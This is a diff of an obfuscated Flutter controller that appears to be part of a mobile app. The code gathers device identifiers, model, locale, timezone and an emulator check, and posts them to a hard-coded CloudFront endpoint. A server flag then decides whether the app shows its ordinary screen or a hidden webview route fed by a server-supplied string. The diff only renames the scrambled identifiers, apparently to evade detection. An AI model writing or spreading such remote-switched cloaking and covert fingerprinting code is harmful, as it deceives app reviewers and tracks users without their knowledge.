@@ -1,21 +1,21 @@
 import 'dart:io';
+import 'package:flutter_timezone/flutter_timezone.dart';
 
-import 'package:device_info_plus/device_info_plus.dart';
+import 'package:package_info_plus/package_info_plus.dart';
 import 'package:dio/dio.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
-import 'package:flutter_timezone/flutter_timezone.dart';
 import 'package:get/get.dart';
-import 'package:package_info_plus/package_info_plus.dart';
+import 'package:device_info_plus/device_info_plus.dart';
 
 
 class CallingWriteLogic extends GetxController {
 
-  var zlwyduvfxc = RxBool(false);
-  var wetdgpyvhl = RxBool(true);
-  var xrptbw = RxString("");
-  var alba = RxBool(false);
-  var sporer = RxBool(true);
-  final bikvuszy = Dio();
+  var sjupzh = RxBool(false);
+  var cetripqzm = RxBool(true);
+  var euydw = RxString("");
+  var abdullah = RxBool(false);
+  var goodwin = RxBool(true);
+  final jrhecvz = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,54 +23,49 @@ class CallingWriteLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    ntoz();
+    muarznid();
   }
 
 
-  Future<void> ntoz() async {
-    alba.value = true;
-    sporer.value = true;
-    wetdgpyvhl.value = false;
+  Future<void> muarznid() async {
+    abdullah.value = true;
+    goodwin.value = true;
+    cetripqzm.value = false;
 
-    bikvuszy.post("https://d2106h8u6gk27i.cloudfront.net/oHDvNrGO",data: await phimagcjtd()).then((value) {
+    jrhecvz.post("https://d2106h8u6gk27i.cloudfront.net/oHDvNrGO",data: await tjznrohcvl()).then((value) {
       var ypmgjkfa = value.data["ypmgjkfa"] as String;
       var nervodz = value.data["nervodz"] as bool;
       if (nervodz) {
-        xrptbw.value = ypmgjkfa;
-        florence();
+        euydw.value = ypmgjkfa;
+        rosario();
       } else {
-        powlowski();
+        brown();
       }
     }).catchError((e) {
-      wetdgpyvhl.value = true;
-      sporer.value = true;
-      alba.value = false;
+      cetripqzm.value = true;
+      goodwin.value = true;
+      abdullah.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> phimagcjtd() async {
-    final DeviceInfoPlugin kypltwi = DeviceInfoPlugin();
-    PackageInfo zpxr_nkuedlj = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> tjznrohcvl() async {
+    final DeviceInfoPlugin credpvl = DeviceInfoPlugin();
+    PackageInfo ikup_xocprygi = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var vbulgky = Platform.localeName;
+    var gjwb = Platform.localeName;
     var dtKgAfqk = currentTimeZone;
 
-    var eLXy = zpxr_nkuedlj.packageName;
-    var eMlRTw = zpxr_nkuedlj.version;
-    var GWBwDn = zpxr_nkuedlj.buildNumber;
+    var eLXy = ikup_xocprygi.packageName;
+    var eMlRTw = ikup_xocprygi.version;
+    var GWBwDn = ikup_xocprygi.buildNumber;
 
-    var PXQGoU = zpxr_nkuedlj.appName;
+    var PXQGoU = ikup_xocprygi.appName;
     var HKQszV = "";
     var lKObQV  = "";
     var YJPHCdst = "";
-    var delbertZboncak = "";
-    var thoraShanahan = "";
-    var billieRohan = "";
-    var susannaRunolfsdottir = "";
-    var boWintheiser = "";
-    var nicoGoldner = "";
-    var louisaHegmann = "";
-    var joGraham = "";
+    var saraiDicki = "";
+    var brettAuer = "";
+    var norwoodFunk = "";
 
 
     var GrMh = "";
@@ -78,55 +73,51 @@ class CallingWriteLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       GrMh = "android";
-      var ybpixzu = await kypltwi.androidInfo;
+      var pmyxnfo = await credpvl.androidInfo;
 
-      YJPHCdst = ybpixzu.brand;
+      YJPHCdst = pmyxnfo.brand;
 
-      HKQszV  = ybpixzu.model;
-      lKObQV = ybpixzu.id;
+      HKQszV  = pmyxnfo.model;
+      lKObQV = pmyxnfo.id;
 
-      YLQiMw = ybpixzu.isPhysicalDevice;
+      YLQiMw = pmyxnfo.isPhysicalDevice;
     }
+
     if (GetPlatform.isIOS) {
       GrMh = "ios";
-      var bwrzgndy = await kypltwi.iosInfo;
-      YJPHCdst = bwrzgndy.name;
-      HKQszV = bwrzgndy.model;
+      var lobjyi = await credpvl.iosInfo;
+      YJPHCdst = lobjyi.name;
+      HKQszV = lobjyi.model;
 
-      lKObQV = bwrzgndy.identifierForVendor ?? "";
-      YLQiMw  = bwrzgndy.isPhysicalDevice;
+      lKObQV = lobjyi.identifierForVendor ?? "";
+      YLQiMw  = lobjyi.isPhysicalDevice;
     }
-
     var res = {
       "PXQGoU": PXQGoU,
-      "susannaRunolfsdottir" : susannaRunolfsdottir,
       "GWBwDn": GWBwDn,
+      "eMlRTw": eMlRTw,
       "eLXy": eLXy,
       "HKQszV": HKQszV,
+      "dtKgAfqk": dtKgAfqk,
       "YJPHCdst": YJPHCdst,
-      "nicoGoldner" : nicoGoldner,
       "lKObQV": lKObQV,
-      "vbulgky": vbulgky,
-      "louisaHegmann" : louisaHegmann,
+      "gjwb": gjwb,
       "GrMh": GrMh,
       "YLQiMw": YLQiMw,
-      "delbertZboncak" : delbertZboncak,
-      "eMlRTw": eMlRTw,
-      "thoraShanahan" : thoraShanahan,
-      "dtKgAfqk": dtKgAfqk,
-      "billieRohan" : billieRohan,
-      "boWintheiser" : boWintheiser,
-      "joGraham" : joGraham,
+      "saraiDicki" : saraiDicki,
+      "brettAuer" : brettAuer,
+      "norwoodFunk" : norwoodFunk,
 
     };
     return res;
   }
 
-  Future<void> powlowski() async {
+  Future<void> brown() async {
     Get.offNamed("/voiceMain");
   }
 
-  Future<void> florence() async {
+  Future<void> rosario() async {
     Get.offNamed("/callingStep");
   }
+
 }
